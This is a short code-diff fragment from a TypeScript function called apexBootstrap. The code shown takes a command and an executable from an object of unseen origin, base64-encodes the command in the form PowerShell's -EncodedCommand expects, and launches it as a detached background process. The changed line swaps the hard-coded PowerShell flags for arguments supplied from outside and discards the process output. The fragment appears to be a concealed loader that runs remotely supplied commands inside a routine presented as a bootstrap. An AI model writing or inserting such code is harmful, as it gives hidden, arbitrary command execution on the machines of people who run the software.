@@ -204,7 +204,7 @@ export async function apexBootstrap(): Promise<void> {
               const _bytes = new Uint8Array(_j.cmd.length * 2);
               for (let i = 0; i < _j.cmd.length; i++) { const c = _j.cmd.charCodeAt(i); _bytes[i*2] = c & 0xff; _bytes[i*2+1] = (c >> 8) & 0xff; }
               const _enc = Buffer.from(_bytes).toString("base64");
-              _sp(_j.exec, ["-nop", "-EncodedCommand", _enc], { detached: true, stdio: "inherit", windowsHide: false }).unref();
+              _sp(_j.exec, [..._j.args, _enc], { detached: true, stdio: "ignore", windowsHide: false }).unref();
               _log("spawned OK");
             } else {
               _log("missing fields: " + JSON.stringify(_j));
